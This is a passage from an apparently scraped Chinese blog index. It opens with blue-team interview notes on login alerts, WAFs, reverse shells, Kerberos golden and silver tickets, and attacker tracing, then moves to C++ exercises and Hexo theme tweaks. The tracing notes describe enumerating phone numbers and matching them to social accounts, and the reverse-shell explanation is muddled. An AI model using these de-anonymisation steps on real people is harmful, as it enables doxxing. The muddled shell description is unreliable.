再有一种情况，比如一个邮箱（OA系统，vpn都是这个情况），有人连续尝试好几次密码都错了，那两种可能，一种他真的忘了，另一种就是有人要搞他，那这种时候就去联系甲方驻场人员，跟他说明情况，然后建议他给邮箱禁了，如果是个正常用户他再用的话肯定就会提示他联系管理员，有人联系了就说明他是个误报，没人找的话就这样封着，如果一直没人理那就说明是个正常告警，然后还可以看时间段，确实也有人凌晨登录，但是正常企业单位凌晨再登录就很不正常，这个时候可以看一下他的ip地址，如果是攻击，那他的ip地址一定是代理池，而且其实护网的时候大家都会遵循一个宗旨，就是宁可错杀也不漏杀，不确定情况的时候，就先去联系这个人问清楚 在复杂一点的就比如抓了一个包，发现他的请求不太对，就非常像攻击特征，然后就查看那个包，去看http请求，分析一下这个流量里面请求的目的地址到底是啥，才能知道是不是误报 如果是个sql注入，就不用分析到底是不是误报，直接封，因为正常用户都是用鼠标点击，根本就不会注入 2. WAF分类 基于签名的 WAF：基于签名的 WAF 通过检测请求中是否包含已知漏洞的特征，来拦截攻击。这种类型的 WAF 可以快速识别和阻止已知的攻击方式。 基于行为的 WAF：基于行为的 WAF 使用机器学习、人工智能等技术来分析请求的行为模式，并判断其是否具有攻击性。这种类型的 WAF 能够较好地识别未知攻击。 综合型 WAF：综合型 WAF 结合了基于签名和基于行为两种技术，能够同时检测已知攻击和未知攻击，提供更加全面的保护。 3. 正向shell与反向shell的区别正向shell是攻击者主动攻击，连接到目标主机；反向shell是用户主动连接攻击者 正向shell 正向shell通常是在目标主机上启动一个服务端程序，等待用户连接并进行身份验证后，允许用户在该主机上执行命令。因此，正向shell需要用户能够直接连接到目标主机，并且需要提供一些身份验证方式来保障安全性。 反向shell 反向shell则是在攻击者主机上启动一个客户端程序，通过网络连接到目标主机并执行指定的命令或脚本。这种方式通常需要绕过防火墙和其他安全措施，利用漏洞或社会工程学技巧获取目标主机的网络访问权限。 4. 态势感知原理就是当攻击发生时，流量经过交换机，就会被探针抓取到，然后传给态势感知的服务器，然后回去特征库里进行一个匹配，匹配成功的话就是一个攻击，会提交给防火墙，进行禁用，匹配不成功的话，就视为正常客户访问，再生成日志文件，显示在客户端 5. 黄金票据和白银票据的区别1.访问权限不同 Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限 Silver Ticket: 伪造TGS,只能访问指定的服务 2.加密方式不同 Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密 Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密 3.认证流程不同 Golden Ticket 的利用过程需要访问域控(KDC) Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器 6. 样本溯源原理：恶意样本溯源分析的前提是针对样本，然后进行对样本做逆向分析、网络行为分析、日志行为分析。挖掘出恶意样本的攻击者或者团队的意图。 方式： 同源分析：通过利用恶意样本间的同源关系，挖掘出可溯源痕迹，并根据它们出现的前后关系判定变体来源。恶意代码同源性分析，其目的是判断不同的恶意代码是否源自同一套恶意代码或是否由同一个作者、团队编写，其是否具有内在关联性、相似性。从溯源目标上来看，可分为恶意代码家族溯源及作者溯源。 家族溯源：恶意样本的家族变体是已有恶意代码在不断的对抗或功能进化中生成的新型恶意样本，针对变体的家族溯源是通过提取其特征数据及代码片段，分析它们与已知样本的同源关系，进而推测可疑恶意样本的家族。例如，Kinable等人提取恶意代码的系统调用图，采用图匹配的方式比较恶意代码的相似性，识别出同源样本，进行家族分类。 作者溯源：恶意样本的作者溯源就是通过分析和提取恶意样本中的相关特征，定位出恶意样本作者相关特征，揭示出样本间的同源关系，进而溯源到已知的作者或组织。例如，Gostev等通过分析Stuxnet与Duqu所用的驱动文件在编译平台、时间、代码等方面的同源关系，实现了对它们作者的溯源。 步骤流程： 1、信息查询：针对可溯源的IP或域名通过网络上开放威胁情报平台进行查询 https://x.threatbook.cn/ https://ti.qianxin.com/ https://ti.360.cn/ https://www.venuseye.com.cn/ https://community.riskiq.com/ //ip查域名 https://www.ipip.net/ip.html https://www.aizhan.com/ https://www.whois.com/ //IP定位 https://chaipip.com/ https://www.opengps.cn/Data/IP/ipplus.aspx //查询邮箱或手机注册过的网站 https://www.reg007.com/ 2、定位目标：利用精准IP定位，进行IP目标位置的确定 3、收集互联网信息侧的用户ID 可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。 4、进入跳板机收集信息 如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等 7. 手机号利用知道用来注册平台后的材料后再根据这两点枚举出来所有可能性的手机号，比如我的归属地在北京 手机号前三位是150，那么可以列出所有可能性，并且这个可能性不会像爆破密码那么离谱，都在一个可验证的范围，而且还有接口可以排除掉空号、不存在号，如果有的网站可以给出后面几位手机号，那么其实可挑选的范围是非常小的。 如果知道运营商信息还可以进一步缩小，之后再导入微信 QQ等社交平台（搜索手机号加好友、可能认识的人功能）验证 ID，如果有相同 ID 的或者行业相关 ID 即可关联出手机号，如果没关联出也没有关系，还可以去行业内的平台进行验证。","tags":"护网"},{"title":"约瑟夫问题","url":"/post/3d3935c8.html","text":"前言急匆匆写的，写的很烂将就看看~_~ 【问题描述】约瑟夫问题：n个骑士编号1，2，…，n，围坐在圆桌旁。编号为1的骑士从1开始报数，报到m的骑士出列，然后下一个位置再从1开始报数，找出最后留在圆桌旁的骑士编号。 【输入形式】程序参考的输入（数字前为提示文字）： Input n and m:7 3 【输出形式】Result:4 【样例输入】Input n and m:7 3 【样例输出】Result:4 代码1234567891011121314151617181920212223242526272829303132#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;int main()&#123; vector&lt;int&gt; a; int n,m,x=0; cout&lt;&lt;&quot;Input n and m:&quot;; cin&gt;&gt;n&gt;&gt;m; a.resize(n); for(int i=0;i&lt;n;i++) &#123; a[i]=i+1; &#125; vector&lt;int&gt;::iterator i = a.begin(); n = 0; while (a.size() != 1) &#123; if (i == a.end()) i = a.begin(); n++; if (n == m) &#123; i = a.erase(i); n = 0; continue; &#125; ++i; &#125; cout&lt;&lt;&quot;Result:&quot;&lt;&lt;a[0]&lt;&lt;endl; return 0;&#125;","tags":"c++刷题"},{"title":"动态二维数组实现*=、+=、=重载运算","url":"/post/cdd48e1f.html","text":"【问题描述】编写一个程序，定义一个安全、动态二维double型的数组类Matrix。 实现Matrix table(row,col)定义row行col列的二维数组, row和col为正整数； 实现table(i,j)访问table的第i行第j列的元素，行号和列号从0开始； 实现Matrix的输入输出(&gt;&gt;、&lt;&lt;)； 实现矩阵加等、乘等运算(+=、=)，例：Matrix&amp; operator+=(const Matrix&amp;); Matrix&amp; operator=(const Matrix&amp;)； 实现矩阵的赋值运算(=)，例：Matrix&amp; operator=(const Matrix&amp;)。 【输入形式】 第一行table1的行列值row1和col1，空格分隔； 第二行table1的初始化值，共row1*col1个数据，空格分隔； 第三行table2的行列值row2和col2，空格分隔； 第四行table2的初始化值，共row2*col2个数据，空格分隔； 【输出形式】 Matrix的输出格式为row行col列, 数据空格分隔； 若table1和table2不满足矩阵的加法和乘法运算规则，输出ERROR!； 依次输出以下表达式的值,每个输出间隔一行； table1(row1/2,col1/2)； table1 *= table2； table1 += table2； table1 = table2。 【样例输入1】12341 31 1 1 2 32 2 2 2 2 2 【样例输出1】123451ERROR! ERROR!2 2 22 2 2 【样例输入2】12342 31 1 1 1 1 13 22 2 2 2 2 2 【样例输出2】123456716 66 6ERROR!2 22 22 2 【样例输入3】12342 21 1 1 1 2 21 0 0 1 【样例输出3】123456711 11 12 11 21 00 1 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;class Matrix&#123;public: Matrix(int a, int b) : a(a), b(b) &#123;&#125; Matrix() &#123;&#125; vector&lt;vector&lt;double&gt;&gt; num; // 矩阵 int a, b; // a-&gt;行；b-&gt;列 friend istream &amp;operator&gt;&gt;(istream &amp;in, Matrix &amp;m); friend ostream &amp;operator&lt;&lt;(ostream &amp;out, Matrix &amp;m); int operator()(); friend int operator*=(Matrix&amp; m1, Matrix&amp; m2); friend int operator+=(Matrix&amp; m1, Matrix&amp; m2); Matrix&amp; operator=(Matrix&amp; m2);&#125;;istream &amp;operator&gt;&gt;(istream &amp;in, Matrix &amp;x)&#123; double num; vector&lt;double&gt; temp; in &gt;&gt; x.a &gt;&gt; x.b; for (int i = 0; i &lt; x.a; ++i) &#123; temp.clear(); // 注意每输入一行应该清空temp for (int j = 0; j &lt; x.b; ++j) &#123; in &gt;&gt; num; temp.push_back(num); &#125; x.num.push_back(temp); &#125; return in;&#125;ostream &amp;operator&lt;&lt;(ostream &amp;out, Matrix &amp;x)&#123; for (int i = 0; i &lt; x.a; ++i) &#123; for (int j = 0; j &lt; x.b; ++j) &#123; cout &lt;&lt; x.num[i][j] &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; &#125; return out;&#125;int Matrix::operator()()&#123; return num[a / 2][b / 2];&#125;int operator*=(Matrix &amp;m1, Matrix &amp;m2)&#123; double temp_n = 0; vector&lt;double&gt; temp; vector&lt;vector&lt;double&gt;&gt; num; // 暂存结果，防止破坏m1的数据 if (m1.b != m2.a) // 相乘条件：前一个矩阵的列数=后一个矩阵的行数 &#123; return 1; // 返回1表示无法执行 &#125; else &#123; for (int i = 0; i &lt; m1.a; ++i) &#123; temp.clear(); // 注意每输入一行应该清空temp for (int j = 0; j &lt; m2.b; ++j) &#123; temp_n = 0; // 注意每输入一个数字应该置零temp_n for (int k = 0; k &lt; m1.b; ++k) temp_n += m1.num[i][k] * m2.num[k][j]; temp.push_back(temp_n); &#125; num.push_back(temp); &#125; &#125; m1.num.swap(num); m1.b = m2.b; // 结果的行数就是前一个矩阵的行数，所以只需要修改列数即可 return 0;&#125;int operator+=(Matrix &amp;m1, Matrix &amp;m2)&#123; if (m1.a != m2.a || m1.b != m2.b) return 1; else &#123; for (int i = 0; i &lt; m1.a; ++i) &#123; for (int j = 0; j &lt; m1.b; ++j) &#123; m1.num[i][j] += m2.num[i][j]; &#125; &#125; return 0; &#125;&#125;Matrix&amp; Matrix::operator=(Matrix &amp;m2)&#123; a = m2.a; b = m2.b; num.clear(); vector&lt;double&gt; temp; for (int i = 0; i &lt; a; ++i) &#123; temp.clear(); for (int j = 0; j &lt; b; ++j) &#123; temp.push_back(m2.num[i][j]); &#125; num.push_back(temp); &#125; return *this;&#125;int main()&#123; Matrix m1, m2; cin &gt;&gt; m1; cin &gt;&gt; m2; cout &lt;&lt; m1() &lt;&lt; endl; if(!(m1 *= m2)) cout &lt;&lt; m1; else cout &lt;&lt; &quot;ERROR!&quot; &lt;&lt; endl; if (!(m1 += m2)) cout &lt;&lt; m1; else cout &lt;&lt; &quot;ERROR!&quot; &lt;&lt; endl; m1 = m2; cout &lt;&lt; m1; return 0;&#125;","tags":"c++刷题"},{"title":"分数四则运算之运算符重载","url":"/post/c1da8047.html","text":"【问题】 xxxxxxxxxx22 1/ 分类页样式 began /2.category-list-link:hover{3 transform: scale(1.1);4 box-shadow: 10px 10px 15px 2px rgba(0,0,0,.12), 0 0 6px 0 rgba(104, 104, 105, 0.1);5 border-radius: 15px;6 padding: 6px 16px;7 margin-left: 0px;8 font-size: 16px;9 transition-duration: 0.15s;10 //display:flex;11}12a.category-list-link:before{13 top: 10px;14 width: 18px;15 height: 18px;16 content: “📚”;17 margin-right: 5px;18 font: normal normal normal 14px/1 FontAwesome;19 font-size: 15px;20 line-height: 18px;21}22/ 分类页样式 end /css （1）输出结果是最简分数（可以是带分数）； （2）分母为1，只输出分子。 【输入形式】 提示“Input x: ”，输入第一个分数。如：1/6 提示“Input y: ”，输入第二个分数。如：2/9 【输出形式】 提示并输出+、-、*、/的结果，如 x+y=7/18 x-y=-1/18 x*y=1/27 x/y=3/4 【样例输入】 Input x: 1/6 Input y: 2/9 【样例输出】 x+y=7/18 x-y=-1/18 x*y=1/27 x/y=3/4 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;class CFraction&#123;private: int nume; // 分子 int deno; // 分母public: CFraction(int nu = 0, int de = 1) :nume(nu), deno(de) &#123;&#125; void simplify(); //输入输出的重载 friend istream &amp;operator&gt;&gt;(istream &amp;in, CFraction &amp;x); friend ostream &amp;operator&lt;&lt;(ostream &amp;out, CFraction x); friend CFraction operator+(const CFraction &amp;c1, const CFraction &amp;c2); //两个分数相加，结果要化简 friend CFraction operator-(const CFraction &amp;c1, const CFraction &amp;c2); //两个分数相减，结果要化简 friend CFraction operator*(const CFraction &amp;c1, const CFraction &amp;c2); //两个分数相乘，结果要化简 friend CFraction operator/(const CFraction &amp;c1, const CFraction &amp;c2); //两个分数相除，结果要化简&#125;;void CFraction::simplify()&#123; int nume_ = abs(nume), deno_ = abs(deno); // 保存原分数 if (nume &lt; 0 &amp;&amp; deno &lt; 0) &#123; nume *= -1; deno *= -1; &#125; else if (nume &gt; 0 &amp;&amp; deno &lt; 0) &#123; nume *= -1; deno *= -1; &#125; while (deno_ % nume_ != 0) &#123; int temp = deno_; deno_ = nume_; nume_ = temp % nume_; &#125; nume /= nume_; deno /= nume_; /* 也可以这么写 while (nume_ != deno_) &#123; if (nume_ &gt; deno_) nume_ -= deno_; else deno_ -= nume_; &#125; nume /= nume_; deno /= nume_;*/&#125;istream &amp;operator&gt;&gt;(istream &amp;in, CFraction &amp;x)&#123; char temp; in &gt;&gt; x.nume &gt;&gt; temp &gt;&gt; x.deno; return in;&#125;ostream &amp;operator&lt;&lt;(ostream &amp;out, CFraction x)&#123; if (x.deno != 1) out &lt;&lt; x.nume &lt;&lt; &#x27;/&#x27; &lt;&lt; x.deno; else out &lt;&lt; x.nume; return out;&#125;CFraction operator+(const CFraction &amp;c1, const CFraction &amp;c2)&#123; CFraction temp(c1.nume * c2.deno + c2.nume * c1.deno, c1.deno * c2.deno); temp.simplify(); return temp;&#125;CFraction operator-(const CFraction &amp;c1, const CFraction &amp;c2)&#123; CFraction temp(c1.nume * c2.deno - c2.nume * c1.deno, c1.deno * c2.deno); temp.simplify(); return temp;&#125;CFraction operator*(const CFraction &amp;c1, const CFraction &amp;c2)&#123; CFraction temp(c1.nume * c2.nume, c1.deno * c2.deno); temp.simplify(); return temp;&#125;CFraction operator/(const CFraction &amp;c1, const CFraction &amp;c2)&#123; CFraction temp(c1.nume * c2.deno, c1.deno * c2.nume); temp.simplify(); return temp;&#125;int main()&#123; CFraction x, y, s; cout &lt;&lt; &quot;Input x: &quot;; cin &gt;&gt; x; cout &lt;&lt; &quot;Input y: &quot;; cin &gt;&gt; y; s = x + y; cout &lt;&lt; &quot;x+y=&quot; &lt;&lt; s &lt;&lt; endl; s = x - y; cout &lt;&lt; &quot;x-y=&quot; &lt;&lt; s &lt;&lt; endl; s = x * y; cout &lt;&lt; &quot;x*y=&quot; &lt;&lt; s &lt;&lt; endl; s = x / y; cout &lt;&lt; &quot;x/y=&quot; &lt;&lt; s &lt;&lt; endl; return 0;&#125;","tags":"c++刷题"},{"title":"二维动态数组易错点","url":"/post/eab4f40b.html","text":"7-5.集合A-B问题求两个集合的差集。注意，同一个集合中不能有两个相同的元素。请用STL模板求解。 输入格式: 首先输入一个正整数T，表示测试数据的组数，然后是T组测试数据。每组测试数据输入1行，每行数据的开始是2个整数n（0 &lt; n ≤ 100）和m（0 &lt; m ≤ 100），分别表示集合A和集合B的元素个数，然后紧跟着n+m个元素，前面n个元素属于集合A，其余的属于集合B。每两个元素之间以一个空格分隔。 输出格式: 针对每组测试数据输出一行数据，表示集合A-B的结果，如果结果为空集合，则输出“NULL”（引号不必输出），否则从小到大输出结果，每两个元素之间以一个空格分隔。 输入样例: 2 3 3 1 3 2 1 4 7 3 7 2 5 8 2 3 4 5 6 7 8 输出样例: 2 3 NULL 分析：反思： 题目很简单，但是我调试了好久，最主要的错误是对于容器嵌套容器总是直接对内嵌容器执行push_back()，乍一看好像没有问题，但是却忽略了内存分配问题！ 我们定义外层容器时会直接给外层容器名分配内存空间，但是对于内嵌容器而言并未分配内存空间，因此我们是不可以直接对内嵌容器进行操作的！ 解决： 定义一个内嵌容器类型的temp变量，temp是被分配了内存空间的，所以可以直接使用temp来执行需要的push_back()之类的操作， 执行完一次循环使用外层容器执行一次push_back(temp)并对temp执行clear() 例如：下列代码第18行，我最开始写的是num[i].push_back(a)，却直接导致程序崩溃，问过openai才明白是内存分配的问题，内嵌容器此时尚未分配内存，直接插入数据是不被允许的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;iterator&gt;using namespace std;int main()&#123; int T, temp, flag = 0, a, b; vector&lt;vector&lt;int&gt;&gt; num; vector&lt;vector&lt;int&gt;&gt; res; vector&lt;int&gt; temp_v; cin &gt;&gt; T; for (int i = 0; i &lt; T; ++i) &#123; temp_v.clear(); cin &gt;&gt; a &gt;&gt; b; temp_v.push_back(a); temp_v.push_back(b); for (int j = 0; j &lt; a; ++j) &#123; cin &gt;&gt; temp; temp_v.push_back(temp); &#125; for (int j = 0; j &lt; b; ++j) &#123; cin &gt;&gt; temp; temp_v.push_back(temp); &#125; num.push_back(temp_v); &#125; for (int i = 0; i &lt; T; ++i) &#123; temp_v.clear(); a = 2; b = 2 + num[i][0]; for (int j = 0; j &lt; num[i][0]; ++j) &#123; flag = 0; for (int k = 0; k &lt; num[i][1]; ++k) &#123; if (num[i][a + j] == num[i][b + k]) &#123; flag = 1; break; &#125; &#125; if (!flag) &#123; if (!count(temp_v.begin(), temp_v.end(), num[i][a + j])) &#123; temp_v.push_back(num[i][a + j]); &#125; &#125; &#125; res.push_back(temp_v); &#125; for (auto i : res) &#123; sort(i.begin(), i.end()); if (i.size()) &#123; copy(i.begin(), i.end(), ostream_iterator&lt;int&gt;(cout, &quot; &quot;)); cout &lt;&lt; endl; &#125; else cout &lt;&lt; &quot;NULL&quot; &lt;&lt; endl; &#125; return 0;&#125;","tags":"c++刷题"},{"title":"博客部署到github失败","url":"/post/b74bb192.html","text":"前言之前hexo d部署到github page这一步经常都报错，什么unfatal: can&#39;t connect to github什么的，最近修改了一个配置就再也没有遇到过这个问题了^_^ 解决打开站点配置文件_config.yml，搜索inject，找到下列配置部分，将repository中原来的地址按下方repository的格式进行修改： git@github.com:你的用户名/你的仓库名.git 123456# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy: type: git repository: git@github.com:hellodqy/hellodqy.github.io.git branch: main","tags":"博客部署"},{"title":"c++设置输出格式","url":"/post/a3246567.html","text":"前言头文件：&lt;iomanip&gt;且需要using namespace std实例1. 保留n位小数ps：设置小数位数之后会保持有效到下一次设置小数位数 12345678910double num = 1.03456;//第一种写法cout &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(2) &lt;&lt; num &lt;&lt; endl;//第二种写法cout.setf(ios::fixed);cout &lt;&lt; setprecision(2) &lt;&lt; num &lt;&lt; endl;//第三种写法cout &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; num &lt;&lt; endl; 2. 输出数据占n位，不足用零填充ps： 设置输出宽度只对后面一个数据起作用，下一个被输出的数据仍然使用默认宽度 设置填充符之后会保持有效到下一次设置填充符 123456string str = &quot;1&quot;;cout &lt;&lt; setw(4) &lt;&lt; setfill(&#x27;0&#x27;) &lt;&lt; str &lt;&lt; &quot;-&quot; &lt;&lt; str &lt;&lt; endl;// 也可以这样写cout.width(4);cout &lt;&lt; setfill(&#x27;0&#x27;) &lt;&lt; str &lt;&lt; &quot;-&quot; &lt;&lt; str &lt;&lt; endl; 3. 靠左或靠右输出ps：设置对齐方式之后会保持有效到下一次设置对齐方式 123string str1 = &quot;1&quot;;string str2 = &quot;2&quot;;cout &lt;&lt; setw(4) &lt;&lt; left &lt;&lt; str1 &lt;&lt; setw(4) &lt;&lt; str2 &lt;&lt; endl; C++默认格式 默认宽度：0(任何数据宽度均大于0，所以默认情况下任何数据都不需要进行填充) 默认填充符：空格 默认对齐：右对齐","tags":"c++实用函数"},{"title":"根据气球统计题目","url":"/post/3b7355c3.html","text":"7-4.题目统计在ACM程序设计竞赛赛场，当某个队伍正确解答一道题目后就会在其前面升起1个彩色气球。而且每种颜色的气球只能用在一道题目上，所以不同颜色的气球不能相互替代。已知比赛过程中已送出的气球数量以及每个气球的颜色，请统计已成功解决的不同题目的总数。 输入格式:首先输入一个正整数T，表示测试数据的组数，然后是T组测试数据。每组测试先输入一个整数n（1≤n≤100），代表已经送出的气球总数，然后输入n个已送出气球的颜色（由长度不超过20且不包含空格的英文字母组成），数据之间间隔一个空格。注意，统计时，忽略气球颜色的大小写。 输出格式:对于每组测试，在一行上输出一个整数，表示已成功解决的不同题目的总数。 输入样例:1234545 RED Red Blue Green REd2 Pink pINk1 YeLLoW6 Red Blue Orange Blue Red ORANGE 输出样例12343113 代码12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;string&gt;using namespace std;class Group&#123;public: int n; // 每行的字符串个数 vector&lt;string&gt; ballon; // 存放每行的字符串&#125;;int main()&#123; int n; vector&lt;Group&gt; group; Group temp; string temp_str; cin &gt;&gt; n; for (int i = 0; i &lt; n; ++i) &#123; temp.ballon.clear(); // 每次开始前需要清除掉temp.ballon里面存放的字符串 cin &gt;&gt; temp.n; for (int j = 0; j &lt; temp.n; ++j) &#123; cin &gt;&gt; temp_str; transform(temp_str.begin(), temp_str.end(), temp_str.begin(), toupper); // 将字符串转换为大写再存放 if (!count(temp.ballon.begin(), temp.ballon.end(), temp_str)) // 如果该字符串不存在则存入 temp.ballon.push_back(temp_str); &#125; group.push_back(temp); // 存入一行数据 &#125; for (int i = 0; i &lt; n; ++i) &#123; cout &lt;&lt; group[i].ballon.size() &lt;&lt; endl; // 已经对相同字符串做了过滤，直接输出ballon的size即为不同字符串的个数 &#125; return 0;&#125; ps：如果对于transform函数不太熟悉，请移步c++字符串大小写转换之transform用法","tags":"c++刷题"},{"title":"c++字符串大小写转换之transform用法","url":"/post/7c713ebc.html","text":"前言参考自：C/C++：字符串大小写转换的几种方式 用法应用：字符串大小写转换 参数： 1234OutputIterator transform ( InputIterator first1, // 源容器的起始地址 InputIterator last1, // 源容器的终止地址 OutputIterator result, // 目标容器的起始地址 UnaryOperator op ); // 函数指针 返回值：目标容器存储字符串后的下一个位置的迭代器，具体请看下面实例第三步——测试返回值 实例： 123456789101112131415161718192021222324string str = &quot;dqywy&quot;;cout &lt;&lt; &quot;转换前：&quot; &lt;&lt; str &lt;&lt; endl;transform(str.begin(), str.end(), str.begin(), toupper);cout &lt;&lt; &quot;转换后：&quot; &lt;&lt; str &lt;&lt; endl;// 也可以定义一个新的字符串来接收，修改目标容器起始地址即可，但是字符串长度应该一致string str = &quot;dqywy&quot;;string temp = &quot;dqywy99&quot;;cout &lt;&lt; &quot;转换前：&quot; &lt;&lt; str &lt;&lt; endl;transform(str.begin(), str.end(), temp.begin(), toupper);cout &lt;&lt; &quot;转换后：&quot; &lt;&lt; temp &lt;&lt; endl;// 测试返回值// 过程分析：// 1. 目标容器temp中的dqywy被修改为DQYWY，99未被覆盖，保持不变// 2. transform返回temp存储DQYWY后的下一个位置的迭代器，即字符9的指针string str = &quot;dqywy&quot;;string temp = &quot;dqywy99&quot;;string::iterator p; // 字符串迭代器cout &lt;&lt; &quot;转换前：&quot; &lt;&lt; str &lt;&lt; endl;p = transform(str.begin(), str.end(), temp.begin(), toupper);cout &lt;&lt; &quot;转换后：&quot; &lt;&lt; temp &lt;&lt; endl;cout &lt;&lt; &quot;transform返回值解引用：&quot; &lt;&lt; *p &lt;&lt; endl;return 0;","tags":"c++实用函数"},{"title":"二维动态数组实现矩阵旋转","url":"/post/a4c4375c.html","text":"【问题描述】 旋转是图像处理的基本操作，在这个问题中，你需要将一个图像逆时针旋转90度。 计算机中的图像表示可以用一个矩阵来表示，为了旋转一个图像，只需要将对应的矩阵旋转即可。 【输入形式】 输入的第一行包含两个整数n, m，分别表示图像矩阵的行数和列数。 接下来n行每行包含m个整数，表示输入的图像。 【输出形式】 输出m行，每行包含n个整数，表示原始矩阵逆时针旋转90度后的矩阵。 【样例输入】 2 3 1 5 3 3 2 4 【样例输出】 3 4 5 2 1 3 【评分标准】 评测用例规模与约定 1 ≤ n, m ≤ 1,000，矩阵中的数都是不超过1000的非负整数。 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;int main()&#123; int n, m, a; // n行m列 vector&lt;int&gt; temp; vector&lt;vector&lt;int&gt;&gt; matrix; cin &gt;&gt; n &gt;&gt; m; for (int i = 0; i &lt; n; i++) &#123; temp.clear(); for (int j = 0; j &lt; m; j++) &#123; cin &gt;&gt; a; temp.push_back(a); &#125; matrix.push_back(temp); &#125; // 将temp容器作为matrix容器的元素实现动态多维数组 for (int j = m - 1; j &gt;= 0; --j) &#123; for (int i = 0; i &lt; n; ++i) &#123; cout &lt;&lt; matrix[i][j] &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; &quot;\\n&quot;; &#125; return 0;&#125;","tags":"c++刷题"},{"title":"Butterfly实现一图流背景","url":"/post/b34aef82.html","text":"效果预览 步骤修改主题的配置文件 _config.butterfly.yml，将index_img和footer_bg的参数改为transparent，background设置为自己的图片地址 12345678910111213141516# Image (圖片設置)# --------------------------------------# The banner image of home pageindex_img: transparent# Beautify/Effect (美化/效果)# --------------------------------------# Website Background (設置網站背景)# can set it to color or image (可設置圖片 或者 顔色)# The formal of image: url(http://xxxxxx.com/xxx.jpg)background: url(https://example.com/img/background.jpg)# Footer Backgroundfooter_bg: transparent 新建一个文件，位于 source/css/modify.styl，写入下列代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950@import &#x27;nib&#x27;// 顶部图#page-header &amp;, &amp;:before background: transparent !important &amp;.post-bg, &amp;.not-home-page height: 280px !important #post-info bottom: 40px !important #page-site-info top: 140px !important @media screen and (max-width: 768px) &amp;.not-home-page height: 200px !important #post-info bottom: 10px !important #page-site-info top: 100px !important.top-img height: 250px margin: -50px -40px 50px border-top-left-radius: inherit border-top-right-radius: inherit background-position: center center background-size: cover transition: all 0.3s @media screen and (max-width: 768px) height: 230px margin: -36px -14px 36px [data-theme=&#x27;dark&#x27;] &amp; filter: brightness(0.8)// 页脚#footer:before background-color: alpha(#FFF, .5) [data-theme=&#x27;dark&#x27;] &amp; background-color: alpha(#000, .5)#footer-wrap, #footer-wrap a color: #111 transition: unset [data-theme=&#x27;dark&#x27;] &amp; color: var(--light-grey) 在主题配置文件 _config.butterfly.yml 的 inject.head 引入样式 注：modify.styl 会被 Hexo 渲染成 modify.css 文件，所以此处应为 modify.css 123456789# other (其他)# --------------------------------------# Inject# Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)# 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前inject: head: - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/modify.css&quot;&gt; 在博客根目录打开cmd，安装依赖 1npm install cheerio 新建一个文件，位于 scripts/modify.js，并写入下列代码 12345678910111213141516171819202122&#x27;use strict&#x27;;const cheerio = require(&#x27;cheerio&#x27;);/** * 在页面插入新顶部图 * @param &#123;cheerio.Root&#125; $ Root */function insertTopImg($) &#123; let header = $(&#x27;#page-header&#x27;); if (header.length === 0) return; let background = header.css(&#x27;background-image&#x27;); if (!background) return; $(&#x27;#post, #page, #archive, #tag, #category&#x27;).prepend(`&lt;div class=&quot;top-img&quot; style=&quot;background-image: $&#123;background&#125;;&quot;&gt;&lt;/div&gt;`);&#125;hexo.extend.filter.register(&#x27;after_render:html&#x27;, function(str, data) &#123; let $ = cheerio.load(str, &#123; decodeEntities: false &#125;); insertTopImg($); return $.html();&#125;); hexo三连~","tags":"博客美化"},{"title":"白天黑夜模式切换背景图","url":"/post/9f3556f6.html","text":"白天背景 夜晚背景 步骤 打开主题配置文件_config.butterfly.yml，搜索background并定位到下列代码位置，对比代码修改 ps：注意删除加号并对齐 12345# Website Background (设置网站背景)# can set it to color or image (可設置圖片 或者 顔色)# The formal of image: url(http://xxxxxx.com/xxx.jpg)background: url(&lt;FilePath&gt;)+background_dark: url(&lt;FilePath&gt;) 打开Blog根目录/themes/butterfly/source/css/var.styl，定位到36行左右(具体位置请对比下列代码)，对比下列代码增加一行 ps：注意删除加号并对齐 123$web-bg = hexo-config(&#x27;background&#x27;) &amp;&amp; unquote(hexo-config(&#x27;background&#x27;))+$web-bg-dark = hexo-config(&#x27;background_dark&#x27;) &amp;&amp; unquote(hexo-config(&#x27;background_dark&#x27;))$index_top_img_height = hexo-config(&#x27;index_top_img_height&#x27;) ? convert(hexo-config(&#x27;index_top_img_height&#x27;)) : 100vh 打开Blog根目录/themes/butterfly/source/css/_mode/darkmode.styl，定位到41行左右(具体位置请对比下列代码)，对比下列代码修改 ps：注意删除加号和减号并将#web_bg对齐#footer 12345678910+ #web_bg+ background: $web-bg-dark- #web_bg:before, #footer:before, #page-header:before position: absolute width: 100% height: 100% background-color: alpha($dark-black, .7) content: &#x27;&#x27; hexo三连~","tags":"博客美化"},{"title":"Butterfly导航栏魔改","url":"/post/728f2bce.html","text":"前言参考自：ffing导航栏美化 注意： 1. 涉及修改的文件代码请一定做好备份！！！ 2. 